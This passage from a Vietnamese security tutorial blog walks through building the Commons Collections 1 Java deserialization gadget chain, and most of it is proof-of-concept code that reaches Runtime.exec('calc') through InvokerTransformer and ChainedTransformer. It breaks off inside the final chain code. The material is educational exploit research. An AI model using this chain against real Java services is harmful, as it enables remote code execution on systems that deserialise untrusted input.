ta sẽ truyền vào Runtime.getRuntime() tương tự như invokerTransformer.transform(Runtime.getRuntime());</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Đây chỉ là một POC nhỏ, chỉ để chỉ ra rằng lớp TransformedMap có thể kích hoạt được phương thức của lớp Runtime. Vấn đề của chúng ta bây giờ là cần tìm ai gọi đến method checkSetValue này.</p><h3 id="AbstractMapEntryDecorator-MapEntry"><a href="#AbstractMapEntryDecorator-MapEntry" class="headerlink" title="AbstractMapEntryDecorator.MapEntry"></a>AbstractMapEntryDecorator.MapEntry</h3><p>Tiếp tục <code>Ctrl + chuột trái</code> click vào checkSetValue, ta thấy phương thức AbstractMapEntryDecorator.MapEntry.setValue() gọi đến checkSetValue.</p><ul><li>Lớp AbstractMapEntryDecorator là abstract cha của lớp TransformedMap.</li><li>setValue là phương thức của lớp Map.Entry.</li></ul><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/AbstractInputCheckedMapDecorator-entry-setValue.png"></p><p>Trước tiên chúng ta cần hiểu entry là gì à cách nó được sử dụng trong Map. Các bạn có thể tham khảo ở <a href="https://viblo.asia/p/cac-cach-iterate-map-trong-java-ORNZqjNMl0n">đây</a>.</p><p>Hàm setValue() sẽ thực hiện gán giá trị vào key. Với thư viện map, khi truy cập từng cặp khóa-giá trị (entry) này chúng ta sẽ dùng cách duyệt qua từng entry rồi thao tác với từng entry đó. </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testMapIterator</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        HashMap&lt;String,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key1&quot;</span>, <span class="string">&quot;value1&quot;</span>);</span><br><span class="line">        hashMap.put(<span class="string">&quot;key2&quot;</span>, <span class="string">&quot;value2&quot;</span>);</span><br><span class="line">        hashMap.put(<span class="string">&quot;key3&quot;</span>, <span class="string">&quot;value3&quot;</span>);</span><br><span class="line">        Set&lt;Map.Entry&lt;String, Object&gt;&gt; set = hashMap.entrySet();</span><br><span class="line">        System.out.println(<span class="string">&quot;Results: &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry&lt;String, Object&gt; entry : set) &#123;</span><br><span class="line">            entry.setValue(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//Results: </span></span><br><span class="line">    <span class="comment">//&#123;key1=aaa, key2=aaa, key3=aaa&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Theo dõi hàm setValue:</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/override-setValue-1.png"></p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/override-setValue-2.png"></p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/override-setValue-3.png"></p><p>Phương thức setValue của interface <code>java.util.Map</code> được implements bởi lớp <code>AbstractMapEntryDecorator</code>, tiếp đến phương thức setValue của lớp này được Override bởi phương thức setValue của lớp <code>AbstractInputCheckedMapDecorator.MapEntry</code>.</p><p>Khi duyệt map của lớp bằng <code>AbstractInputCheckedMapDecorator.EntrySetIterator</code>, phương thức next() return ra một <code>AbstractInputCheckedMapDecorator.MapEntry</code>.<br>Do đó chúng ta có thể gọi đến hàm setValue() của <code>AbstractInputCheckedMapDecorator.MapEntry</code>.</p><p>Lớp transformedMap implements lớp <code>AbstractInputCheckedMapDecorator</code>, do đó khi chúng ta decorate một map thành transformedMap và duyệt map bằng entrySet() kết hợp với iterator rồi thực hiện hàm setValue() của transformedMap, nó sẽ thực hiện hàm setValue của lớp <code>AbstractInputCheckedMapDecorator.MapEntry</code>, phương thức này sẽ gọi đến hàm checkSetValue(). Bạn nào mới học mà không hiểu thì đoạn <code>Map.Entry entry : map.entrySet()</code> là làm tắt bỏ bước define Iterator tuy nhiên nó cũng iterator bên trong đó nhé. </p><p>Tiếp tục viết poc từ phương thức này:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, cmd);</span><br><span class="line">        Map&lt;Object, Object&gt; map = (TransformedMap) TransformedMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(), <span class="literal">null</span>, invokerTransformer);</span><br><span class="line">        map.put(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry entry : map.entrySet())&#123;</span><br><span class="line">            entry.setValue(Runtime.getRuntime());<span class="comment">//nếu bạn không hiểu dòng này thì nhìn lại hàm checkSetValue và POC trên kia.</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Nó đã kích hoạt được lệnh exec của lớp Runtime. Bây giờ chúng ta sẽ tìm xem có phương thức readObject nào gọi phương thức setValue này không. Click chuột phải vào hàm setValue và chọn Find Usage. Ở đây mình không thể tìm được lớp nào bởi vì mình chưa decompile trực tiếp các file trong jdk8u65, khá nhiều thứ để làm nên thôi mình sẽ tiếp tục làm theo sơ đồ của người ta.</p><h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><p><code>Ctrl + N</code> để tìm lớp AnnotationInvocationHandler, trong phương thức readObject của lớp này, chúng ta thấy có phương thức setValue được gọi.<br>Hàm tạo của lớp AnnotationInvocationHandler:</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/AnnotationInvocationHandler.png"></p><p>Hàm readObject của lớp AnnotationInvocationHandler:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();</span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">            Map.<span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Map.Entry)var4.next();</span><br><span class="line">            <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">            <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">            <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>Lớp AnnotationInvocationHandler có phạm vi default, nên chúng ta cần lấy lớp này và hàm tạo của nó thông qua reflection, sau đó khởi tạo nó. (stuck cũng lâu phết hic)</p><ul><li>Constructor của lớp Non-public phải lấy bằng phương thức getDeclaredConstructor().</li><li>Tham số thứ nhất của hàm tạo là một lớp, tham số thứ hai là một map.</li></ul><p>Một đoạn code nhỏ để test thử việc khởi tạo lớp AnnotationInvocationHandler:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testTransformedMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, cmd);</span><br><span class="line">        Map&lt;Object, Object&gt; map = (TransformedMap) TransformedMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(), <span class="literal">null</span>, invokerTransformer);</span><br><span class="line">        map.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aihClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihClassConstructor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihClassConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">aihObject</span> <span class="operator">=</span> aihClassConstructor.newInstance(Override.class, map);<span class="comment">//Tham số đầu của constructor là lớp bất kỳ kế thừa Annotation, và Override.class là một lớp thõa mãn. Các bạn có thể tự tìm hiểu thêm về Annotation.</span></span><br><span class="line">        serialize(aihObject);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Đến đây vẫn chưa có gì xảy ra bởi vì:</p><ul><li>Đối tượng Runtime chưa được đặt vào hàm setValue. Và ở đây nó được set là object kiểu <code>AnnotationTypeMismatchExceptionProxy</code>, chúng ta không thể kiểm soát được.<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">    <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">        var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>Chúng ta chưa làm thõa mãn hai điều kiện dẫn đến hàm setValue trong AnnotationInvocationHandler.readObject.</li><li>Đối tượng Runtime không thể serialize và cần được chuyển đổi thành dạng có thể serialize thông qua reflection.</li></ul><h3 id="Giai-quyet-van-de-Runtime-khong-the-serialize"><a href="#Giai-quyet-van-de-Runtime-khong-the-serialize" class="headerlink" title="Giải quyết vấn đề Runtime không thể serialize"></a>Giải quyết vấn đề Runtime không thể serialize</h3><p>Runtime không thể serialize nhưng Runtime.class thì có thể.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">runtimeClass</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> runtimeClass.getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) method.invoke(<span class="literal">null</span>);<span class="comment">//method getRuntime() không cần tham số</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> runtimeClass.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        exec.invoke(runtime, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Thay vì invoke trực tiếp, chúng ta có thể lợi dụng lớp InvokerTransformer để invoke hàm getRuntime hay invoke method và invoke exec của lớp runtime. Mình sẽ đi từng bước cho các bạn dễ hiểu.<br>Đầu tiên là invoke method <code>getDeclaredMethod</code> để lấy ra method getRuntime.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">runtimeClass</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">        String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">        <span class="comment">//Tương đương với Method getRuntimeMethod = runtimeClass.getDeclaredMethod(&quot;getRuntime&quot;);</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">InvokerGetMethod</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> (Method) InvokerGetMethod.transform(Runtime.class);</span><br><span class="line">        <span class="comment">// Tương đương với Method method = runtimeClass.getDeclaredMethod(&quot;getRuntime&quot;);</span></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) getMethod.invoke(<span class="literal">null</span>);</span><br><span class="line">        runtime.exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Tiếp theo là invoke biến <code>getRuntimeMethod</code> để tạo Runtime object. Rồi thực hiện invoke method exec của object runtime mới tạo ra. </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">runtimeClass</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">        <span class="comment">//Tương đương với Method getRuntimeMethod = runtimeClass.getDeclaredMethod(&quot;getRuntime&quot;);</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">InvokerGetMethod</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> (Method) InvokerGetMethod.transform(Runtime.class);</span><br><span class="line">        <span class="comment">//Tương đương với Runtime runtime = (Runtime) method.invoke(null);</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">InvokerRuntime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;);</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) InvokerRuntime.transform(getRuntimeMethod);</span><br><span class="line">        <span class="comment">//Tương đương với exec.invoke(runtime, &quot;calc&quot;);</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">InvokerExec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        InvokerExec.transform(runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Để ý ở phần trên chúng ta có các InvokerTransformer nối tiếp nhau, để thuận tiện hơn người ta đã có tạo ra một lớp là ChainedTransformer, nó cũng thực hiện như InvokerTransformer tuy nhiên điểm khác là nó sẽ thực thi theo một chuỗi gắn kết với nhau. Chúng ta sẽ lợi dụng hàm này để thực thi tương tự như trên.</p><h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/ChainedTransformed.png"></p><p>Viết tiếp chain theo ChainedTranformer:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        chainedTransformer.transform(Runtime.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Kết hợp với TransformedMap chúng ta có chuỗi hoàn chỉnh sau:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span 